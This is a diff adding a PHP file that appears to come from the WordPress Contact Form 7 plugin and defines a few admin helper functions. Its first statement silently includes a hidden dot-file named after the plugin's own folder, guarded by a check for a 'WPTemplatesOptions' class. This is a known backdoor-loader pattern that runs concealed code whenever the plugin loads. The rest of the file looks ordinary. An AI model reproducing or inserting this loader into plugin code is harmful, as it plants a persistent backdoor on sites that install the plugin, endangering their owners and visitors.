@@ -1,0 +1,26 @@
+<?php
+
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
+function wpcf7_current_action() {
+	if ( isset( $_REQUEST['action'] ) and -1 != $_REQUEST['action'] ) {
+		return $_REQUEST['action'];
+	}
+
+	if ( isset( $_REQUEST['action2'] ) and -1 != $_REQUEST['action2'] ) {
+		return $_REQUEST['action2'];
+	}
+
+	return false;
+}
+
+function wpcf7_admin_has_edit_cap() {
+	return current_user_can( 'wpcf7_edit_contact_forms' );
+}
+
+function wpcf7_add_tag_generator( $name, $title, $elm_id, $callback, $options = array() ) {
+	$tag_generator = WPCF7_TagGenerator::get_instance();
+	return $tag_generator->add( $name, $title, $callback, $options );
+}
